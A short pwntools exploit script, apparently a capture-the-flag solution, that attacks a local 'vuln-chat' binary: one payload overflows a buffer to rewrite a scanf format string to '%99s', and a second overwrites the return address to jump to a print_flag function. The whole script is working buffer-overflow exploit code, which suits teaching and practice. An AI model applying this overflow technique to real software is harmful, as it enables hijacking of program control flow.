from pwn import *

# Establish the target process
target = process('./vuln-chat')

# Print the initial text
print target.recvuntil("username: ")

# Form the first payload to overwrite the scanf format string
payload0 = ""
payload0 += "0"*0x14 # Fill up space to format string
payload0 += "%99s" # Overwrite it with "%99s"

# Send the payload with a newline character
target.sendline(payload0)

# Print the text up to the second scanf call
print target.recvuntil("I know I can trust you?")

# From the second payload to overwrite the return address
payload1 = ""
payload1 += "1"*0x31 # Filler space to return address
payload1 += p32(0x804856b) # Address of the print_flag function

# Send the second payload with a newline character
target.sendline(payload1)

# Drop to an interactive shell to view the rest of the input
target.interactive()
